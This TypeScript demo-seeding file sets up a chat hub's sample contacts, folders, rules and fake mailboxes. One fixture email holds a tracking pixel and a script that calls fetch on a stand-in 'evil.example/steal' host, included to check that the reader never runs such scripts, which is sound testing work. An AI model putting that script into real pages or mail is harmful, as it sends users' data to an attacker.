        // relate: stand with someone this way (scripts and tests: following has no demo network of its own).
        if (cmd.action === 'relate') {
          const a = cmd.args as { who?: string; relationship?: P.PersonRelationship };
          if (typeof a?.who !== 'string' || typeof a.relationship !== 'string') {
            this.emit({ t: 'reply', id: cmd.id, ok: false, error: 'relate: { who, relationship }' });
            break;
          }
          this.adds.relate(a.who, a.relationship);
          reply({ ok: true });
          break;
        }
        reply(cmd.action === 'typingLog' ? { typing: this.typingLog } : cmd.action === 'addLog' ? this.adds.counts : cmd.action === 'readLog' ? { reads: this.readLog } : { note: 'demo adapters have no actions' });
        break;
      default:
        if ('id' in cmd) reply();
    }
  }

  stop() {
    for (const t of this.timers) clearTimeout(t);
    this.timers.clear();
    running.delete(this.key);
    if (!running.size && chatterTimer) {
      clearTimeout(chatterTimer);
      chatterTimer = undefined;
    }
  }
}

export function demoFactory(acc: AccountRow, dir: string): InprocAdapter | null {
  if (acc.adapter !== 'demo') return null;
  const key = DEMO_ACCOUNTS.find((d) => d.id === acc.id)?.key;
  return key ? new DemoAdapter(key, acc, dir) : null;
}

export function createDemoAccounts(store: Store): AccountRow[] {
  // A new world (a fresh hub, Reset demo, each test): names and settings changed in the last one start over.
  demoPlaces.clear();
  for (const [c, f] of FIRST_CONVS) c.fact = f;
  for (const [x, f] of FIRST_SPACES) x.fact = f;
  const epoch = Date.now();
  return DEMO_ACCOUNTS.map((d) => store.createAccount({ id: d.id, network: d.network, label: d.label, color: d.color, adapter: 'demo', demo: true, config: { epoch } }));
}

/** Hub-side organisation for the demo: merged people, folders, rules. Applied once. */
export function applyDemoOverlay(store: Store) {
  if (store.one(`SELECT 1 FROM meta WHERE key = 'demo_overlay'`)) return;
  const idn = (net: P.Network, i: P.IdentityFact) => hubId('idn', net, i.nativeId);
  const personOf = (net: P.Network, i: P.IdentityFact) => store.ensurePerson(idn(net, i));
  const merge = (name: string, ...ids: [P.Network, P.IdentityFact][]) => {
    const [first, ...rest] = ids.map(([n, i]) => personOf(n, i));
    for (const r of rest) store.mergePersons(first, r);
    // The name a merge settled on, as a merge would.
    store.updatePerson(first, { name });
    return first;
  };
  const alice = merge('Alice Chen', ['signal', S.alice], ['discord', D.alice], ['matrix', M.alice], ['whatsapp', W.alice], ['telegram', TG.alice]);
  const sam = merge('Sam Rivera', ['signal', S.sam], ['matrix', M.sam]);
  merge('Theo', ['signal', S.theo], ['discord', D.theo]);
  merge('Quinn', ['discord', D.quinn], ['signal', S.quinn]);
  if (MULTI_ACCOUNT) merge('Mo', ['discord', MO.main], ['discord', MO.art]);
  if (MULTI_ACCOUNT) merge('Kit', ['discord', KIT.exe], ['discord', KIT.alt], ['discord', KIT.work], ['signal', KIT.sig], ['matrix', KIT.mx], ['matrix', KIT.nix], ['telegram', KIT.tg]);
  // Your nickname for one of Kit's accounts (docs/chats.md, Names): its heads and its tile say it, and Kit stays Kit.
  if (MULTI_ACCOUNT) store.setIdentityNickname(idn('discord', KIT.alt), 'Kit, raid nights');

  const cnv = (net: P.Network, nativeId: string) => hubId('cnv', net, nativeId);
  const spc = (net: P.Network, nativeId: string) => hubId('spc', net, nativeId);
  store.setFolders([
    {
      id: 'fld_demo-dither',
      name: 'Dither',
      icon: '◐',
      color: '#F2A541',
      items: [
        { kind: 'space', id: spc('discord', g.dither) },
        { kind: 'conversation', id: cnv('matrix', room('libdither-mx', 'matrix.org')) },
        { kind: 'conversation', id: cnv('signal', sgroup('dithercore', '', []).nativeId) },
      ],
    },
    {
      id: 'fld_demo-rust',
      name: 'Rust',
      icon: '🦀',
      color: '#FF8C61',
      items: [
        { kind: 'space', id: spc('discord', g.rust) },
        { kind: 'space', id: spc('matrix', room('rust-space', 'matrix.org')) },
      ],
    },
    {
      id: 'fld_demo-friends',
      name: 'Friends',
      icon: '✿',
      color: '#E86A92',
      items: [
        { kind: 'person', id: alice },
        { kind: 'person', id: sam },
        { kind: 'conversation', id: cnv('signal', sgroup('climb', '', []).nativeId) },
        { kind: 'conversation', id: cnv('discord', snow('gdm-raid')) },
        { kind: 'conversation', id: cnv('matrix', room('house', 'matrix.org')) },
      ],
    },
  ]);
  store.setRule('space', spc('discord', g.rust), 'digest');
  store.setRule('conversation', cnv('discord', ch('dither-ann')), 'all');
  store.setRule('conversation', cnv('signal', sgroup('family', '', []).nativeId), 'all');
  store.setRule('conversation', cnv('discord', ch('hk-routes')), 'smart');
  store.setRule('keyword', 'dither-chat', 'all');
  store.setRule('keyword', 'zyan', 'all');
  store.db.query(`INSERT OR REPLACE INTO meta (key, value) VALUES ('demo_overlay', ?)`).run(String(Date.now()));
}

// ------------------------------------------------------------------ mail (docs/mail.md)

/** The demo world's mail account: plain IMAP with the threading headers on summaries (dither-accounts' §13). */
export const DEMO_MAIL_ACCOUNT = 'acc_demo-mail';
/** A second mail account like Proton's (DITHER_DEMO_MAIL_PROTON=1, scripts/verify-mail.ts --proton). */
export const DEMO_PROTON_ACCOUNT = 'acc_demo-proton';
/** A Gmail account as dither-accounts' imap extractor gives one (DITHER_DEMO_MAIL_GMAIL=1, scripts/verify-mail.ts --gmail). */
export const DEMO_GMAIL_ACCOUNT = 'acc_demo-gmail';
const ME = { name: 'Zyan', email: 'zyan@dither.example' };

/**
 * A few people, a reply thread with quoted text, a Cc'd thread with an attachment, a newsletter and a notification
 * (list headers), and an HTML-only message carrying a tracker and a script (which must never show or run).
 */
export function seedDemoMail(fake: FakeMailBackend, now = Date.now()) {
  fake.addAccount(DEMO_MAIL_ACCOUNT, { kind: 'imap', label: 'Personal mail', email: ME.email, name: ME.name, opts: { ids: 'imap', threadIds: false, refs: true, answer: 3_000 } });
  const H = 3_600_000;
  const D = 24 * H;
  const sam = { name: 'Sam Rivera', email: 'sam@rivera.example' };
  const alice = { name: 'Alice Chen', email: 'alice.chen@example.org' };
  const jo = { name: 'Jo Park', email: 'jo@park.example' };
  const theo = { name: 'Theo', email: 'theo@example.net' };
  const mom = { name: 'Mom', email: 'mom@family.example' };
  const id = (k: string) => `<demo-${k}@dither.example>`;
  const put = (i: FakeInput) => fake.put(DEMO_MAIL_ACCOUNT, { flags: { seen: true }, ...i });

  // Dinner: Sam asks, you answer (Sent), Sam writes back (unread), quoting you.
  put({ messageId: id('dinner-1'), from: [sam], to: [ME], subject: 'Dinner on Friday?', receivedAt: now - 26 * H, text: 'Hey! Are you free after 7 on Friday? There is a new ramen place on Maple Street I want to try.\n\nSam' });
  put({ mailboxId: 'Sent', messageId: id('dinner-2'), inReplyTo: id('dinner-1'), references: [id('dinner-1')], from: [ME], to: [sam], subject: 'Re: Dinner on Friday?', receivedAt: now - 20 * H, text: 'Yes, 7:30 works. Should I book a table?\n\nOn Thu, Sam Rivera <sam@rivera.example> wrote:\n> Hey! Are you free after 7 on Friday? There is a new ramen place on Maple Street I want to try.\n>\n> Sam' });
  put({
    messageId: id('dinner-3'),
    inReplyTo: id('dinner-2'),
    references: [id('dinner-1'), id('dinner-2')],
    from: [sam],
    to: [ME],
    subject: 'Re: Dinner on Friday?',
    receivedAt: now - 40 * 60_000,
    flags: { seen: false },
    text: 'Booked for 7:30, under Rivera. Their menu is here: https://ramen.example/menu/friday-specials-and-the-whole-very-long-list-of-noodles-and-broths-for-this-week?ref=newsletter&utm_source=mail\n\nSee you there!\n\n-- \nSam Rivera\n\nOn Fri, Zyan <zyan@dither.example> wrote:\n> Yes, 7:30 works. Should I book a table?\n>\n> On Thu, Sam Rivera <sam@rivera.example> wrote:\n>> Hey! Are you free after 7 on Friday?',
  });

  // The lease: Alice, with Jo in Cc and a PDF; you answered; Jo added a line.
  put({ messageId: id('lease-1'), from: [alice], to: [ME], cc: [jo], subject: 'Lease renewal', receivedAt: now - 3 * D, text: 'Hi both,\n\nThe landlord sent the renewal. I signed page 2; could you sign pages 3 and 4 and send it back by the 15th?\n\nAlice', attachments: [{ id: 'att-lease', filename: 'lease-renewal.pdf', mime: 'application/pdf', size: 184_320, inline: false, contentId: null }], files: demoFileBytes() });
  put({ mailboxId: 'Sent', messageId: id('lease-2'), inReplyTo: id('lease-1'), references: [id('lease-1')], from: [ME], to: [alice], cc: [jo], subject: 'Re: Lease renewal', receivedAt: now - 2 * D, text: 'Signed and scanned, it is attached. Thanks for sorting this out!\n\nOn Mon, Alice Chen <alice.chen@example.org> wrote:\n> The landlord sent the renewal.' });
  put({ messageId: id('lease-3'), inReplyTo: id('lease-2'), references: [id('lease-1'), id('lease-2')], from: [jo], to: [alice, ME], subject: 'Re: Lease renewal', receivedAt: now - 9 * H, flags: { seen: false }, text: 'Done on my side too. Do we want to ask about the parking spot while we are at it?\n\nJo' });

  // A newsletter and a notification: list headers say so.
  put({
    messageId: id('rust-weekly'),
    from: [{ name: 'This Week in Rust', email: 'newsletter@rust-weekly.example' }],
    to: [ME],
    subject: 'This Week in Rust 512',
    receivedAt: now - 5 * H,
    flags: { seen: false },
    bulk: { listId: '<weekly.rust-weekly.example>', unsubscribe: '<https://rust-weekly.example/unsubscribe>', precedence: 'bulk', autoSubmitted: null },
    text: 'Hello and welcome to another issue of This Week in Rust!\n\nUpdates from the Rust project:\n• Async closures are stable\n• A new edition guide\n\nRead it on the web: https://rust-weekly.example/512',
    html: '<h1>This Week in Rust 512</h1><p>Hello and welcome to another issue!</p>',
  });
  put({
    messageId: id('gh-25'),
    from: [{ name: 'GitHub', email: 'notifications@github.example' }],
    to: [ME],
    subject: 'Re: [libdither/dither-chat] Mail: read-only, end to end (#25)',
    receivedAt: now - 3 * H,
    flags: { seen: false },
    bulk: { listId: '<dither-chat.libdither.github.example>', unsubscribe: null, precedence: 'list', autoSubmitted: null },
    text: 'CI passed on feat/mail-read.\n\nReply to this email directly or view it on GitHub.',
  });

  // HTML only, with a tracking pixel and a script: the reader shows its text part, made from the HTML.
  put({
    messageId: id('shipped'),
    from: [{ name: 'Maple Hardware', email: 'orders@maple-hardware.example' }],
    to: [ME],
    subject: 'Your order has shipped',
    receivedAt: now - 30 * H,
    flags: { seen: false },
    text: null,
    html:
      '<html><head><style>p{color:#333}</style><script>document.title="hacked";fetch("https://evil.example/steal")</script></head><body>' +
      '<p>Good news: <b>your order #4471 has shipped</b>.</p><p>It should arrive on Tuesday.</p>' +
      '<p><a href="https://maple-hardware.example/track/4471">Track your parcel</a></p>' +
      '<img src="https://tracker.example/open.gif?u=demo" width="1" height="1" alt="">' +
      '<script>alert("never")</script></body></html>',
  });

  // Older, read: Theo, and what you sent Mom.
  put({ messageId: id('climb'), from: [theo], to: [ME], subject: 'Climbing on Sunday', receivedAt: now - 6 * D, text: 'Gym at 10 on Sunday? I can bring the spare harness.\n\nTheo' });
  put({ mailboxId: 'Sent', messageId: id('photos'), from: [ME], to: [mom], subject: 'Photos from the weekend', receivedAt: now - 8 * D, text: 'Here are the photos from the lake. The one of the dog is my favourite.' });
  put({ messageId: id('photos-re'), inReplyTo: id('photos'), references: [id('photos')], from: [mom], to: [ME], subject: 'Re: Photos from the weekend', receivedAt: now - 7 * D, text: 'Lovely! Can you print the dog one for me?\n\nLove, Mom' });
  for (let i = 0; i < 12; i++)
    put({
      messageId: id(`digest-${i}`),
      from: [{ name: 'Maple Street Library', email: 'news@library.example' }],
      to: [ME],
      subject: `New arrivals, week ${40 - i}`,
      receivedAt: now - (9 + i) * D,
      bulk: { listId: '<arrivals.library.example>', unsubscribe: '<mailto:leave@library.example>', precedence: 'bulk', autoSubmitted: null },
      text: `This week's new books and events at the library (week ${40 - i}).`,
    });
  seedHtmlMail(fake, DEMO_MAIL_ACCOUNT, ME, now);
  // A folder the hub does not follow, with an old receipt: only a search of the server finds it (slice 7).
  fake.addMailbox(DEMO_MAIL_ACCOUNT, { id: 'Receipts', name: 'Receipts', path: 'Receipts', parentId: null, role: null, unread: null, total: null });
  put({ mailboxId: 'Receipts', messageId: id('receipt'), from: [{ name: 'Maple Hardware', email: 'orders@maple-hardware.example' }], to: [ME], subject: 'Your receipt, order #4102', receivedAt: now - 40 * D, text: 'Thank you for your order. The drill comes with a two-year warranty; keep this email as your proof of purchase.' });
  // A big mailbox (scripts/verify-mail.ts --big): years of Archive and older Inbox, below the mail above, and a folder.
  if (process.env.DITHER_DEMO_MAIL_BIG) {
    for (const [box, n] of [['Archive', 40_000], ['INBOX', 400]] as const) fillMailbox(fake, DEMO_MAIL_ACCOUNT, box, n, { newest: now - 30 * D, oldest: now - 3 * 365 * D, self: ME.email });
    // A folder the hub does not follow: listed when you open it.
    fake.addMailbox(DEMO_MAIL_ACCOUNT, { id: 'Projects', name: 'Projects', path: 'Projects', parentId: null, role: null, unread: null, total: null });
    fillMailbox(fake, DEMO_MAIL_ACCOUNT, 'Projects', 1000, { newest: now - 60 * D, oldest: now - 5 * 365 * D, self: ME.email });
    // As slow as a server far away, so the backfill can be watched.
    fake.setOpts(DEMO_MAIL_ACCOUNT, { latencyMs: 250 });
  }
  if (process.env.DITHER_DEMO_MAIL_PROTON) seedDemoProton(fake, now);
  if (process.env.DITHER_DEMO_MAIL_GMAIL) seedDemoGmail(fake, now);
}

/**
 * A Gmail account (fake.ts `ids: 'gmail'`): a trip planned with Priya, in Inbox, labelled Travel and marked Important,
 * that you answered; Mom's photos, labelled Family; Ben's recipe, starred; a booking you archived under Travel; and
 * list mail, which Gmail's IMAP gives with its list headers but none of Gmail's categories.
 */
function seedDemoGmail(fake: FakeMailBackend, now: number) {
  const H = 3_600_000;
  const D = 24 * H;
  const me = { name: ME.name, email: 'zyan@gmail.example' };
  const priya = { name: 'Priya Nair', email: 'priya@nair.example' };
  const mom = { name: 'Mom', email: 'mom@family.example' };
  const ben = { name: 'Ben Okafor', email: 'ben@okafor.example' };
  fake.addAccount(DEMO_GMAIL_ACCOUNT, { kind: 'imap', label: 'Gmail', email: me.email, name: me.name, opts: { ids: 'gmail', answer: 3_000 } });
  const id = (k: string) => `<demo-gmail-${k}@dither.example>`;
  const put = (i: FakeInput) => fake.put(DEMO_GMAIL_ACCOUNT, { to: [me], flags: { seen: true }, ...i });
  put({ messageId: id('coast-1'), from: [priya], subject: 'Trip to the coast', receivedAt: now - 30 * H, labels: ['Travel', '\\Important'], text: 'Shall we take the early train on Saturday? The tide is low around noon, good for the rock pools.\n\nPriya' });
  put({ mailboxId: GMAIL.sent, messageId: id('coast-2'), inReplyTo: id('coast-1'), references: [id('coast-1')], from: [me], to: [priya], subject: 'Re: Trip to the coast', receivedAt: now - 28 * H, text: 'Yes! I will bring the thermos. 8:10 from the central station?\n\nOn Fri, Priya Nair <priya@nair.example> wrote:\n> Shall we take the early train on Saturday?' });
  put({
    messageId: id('coast-3'),
    inReplyTo: id('coast-2'),
    references: [id('coast-1'), id('coast-2')],
    from: [priya],
    subject: 'Re: Trip to the coast',
    receivedAt: now - 2 * H,
    flags: { seen: false },
    labels: ['Travel'],
    text: '8:10 it is. I booked two seats in the quiet carriage.\n\nOn Fri, Zyan <zyan@gmail.example> wrote:\n> Yes! I will bring the thermos.',
  });
  put({ messageId: id('photos'), from: [mom], subject: 'Garden photos', receivedAt: now - 3 * D, labels: ['Family'], text: 'The roses came out at last. More photos when your uncle sends his.\n\nLove, Mom' });
  put({ messageId: id('bread'), from: [ben], subject: 'Recipe for the bread', receivedAt: now - 5 * D, flags: { seen: true, flagged: true }, text: '500 g flour, 350 g water, 10 g salt, a spoon of starter. Fold it four times, then a night in the fridge.\n\nBen' });
  put({ mailboxId: GMAIL.all, messageId: id('hotel'), from: [{ name: 'Harbour Hotel', email: 'noreply@harbour-hotel.example' }], subject: 'Your booking is confirmed', receivedAt: now - 9 * D, labels: ['Travel'], text: 'One double room, Saturday to Sunday. Check-in from 3 pm.' });
  put({
    messageId: id('rail'),
    from: [{ name: 'Coastal Rail', email: 'news@coastal-rail.example' }],
    subject: 'Timetable changes from December',
    receivedAt: now - 6 * H,
    flags: { seen: false },
    bulk: { listId: '<timetable.coastal-rail.example>', unsubscribe: '<https://coastal-rail.example/leave>', precedence: 'bulk', autoSubmitted: null },
    text: 'From 14 December the 8:10 leaves at 8:12. Weekend trains add a stop at Seal Point.',
  });
  put({
    messageId: id('drive'),
    from: [{ name: 'Cloud Drive', email: 'drive-shares-noreply@cloud.example' }],
    subject: 'Mom shared an album with you',
    receivedAt: now - 3 * D - H,
    bulk: { listId: null, unsubscribe: null, precedence: null, autoSubmitted: 'auto-generated' },
    text: 'Mom shared "Garden 2026" with you.',
  });
}

/**
 * An account whose summaries carry no headers, as Proton's (docs/mail.md "Summaries without headers"): an unread
 * newsletter that says it is one only in its body, a receipt Proton sorted into Transactions, and a stranger's note.
 */
function seedDemoProton(fake: FakeMailBackend, now: number) {
  const D = 24 * 3_600_000;
  const me = { name: ME.name, email: 'zyan@proton.example' };
  fake.addAccount(DEMO_PROTON_ACCOUNT, { kind: 'proton', label: 'Proton mail', email: me.email, name: me.name, opts: { ids: 'proton', threadIds: true, refs: false, state: 'account', events: 'all' } });
  const id = (k: string) => `<demo-proton-${k}@dither.example>`;
  const put = (i: FakeInput) => fake.put(DEMO_PROTON_ACCOUNT, { to: [me], ...i });
  put({
    messageId: id('garden'),
    from: [{ name: 'Garden Club Weekly', email: 'hello@gardenclub.example' }],
    subject: 'Garden Club Weekly: the seed swap is back',
    // Past the 14 days of personal mail fetched ahead, inside the inbox's 30: only the window brings its body.
    receivedAt: now - 20 * D,
    text: 'This Saturday at the library: bring seeds, take seeds. Tomatoes, beans and a lot of marigolds.',
    bulk: { listId: '<weekly.gardenclub.example>', unsubscribe: '<https://gardenclub.example/leave>', precedence: null, autoSubmitted: null },
  });
  put({ messageId: id('statement'), from: [{ name: 'Nimbus Bank', email: 'statements@nimbus-bank.example' }], subject: 'Your November statement is ready', receivedAt: now - 3 * D, labels: ['Category/Transactions'], text: 'Sign in to see your statement.' });
  put({ messageId: id('scarf'), from: [{ name: 'Rowan', email: 'rowan@example.org' }], subject: 'Found your scarf', receivedAt: now - 4 * D, text: 'You left a green scarf at the reading group. Shall I bring it next week?' });
}

/** A made-up safety number for someone in the demo world: 60 digits from their id. */
function demoSafety(who: string): string {
  let h = 7;
  let out = '';
  while (out.length < 60) for (const c of who) out += String((h = (h * 31 + c.charCodeAt(0)) % 1_000_003) % 10);
  return out.slice(0, 60);
}
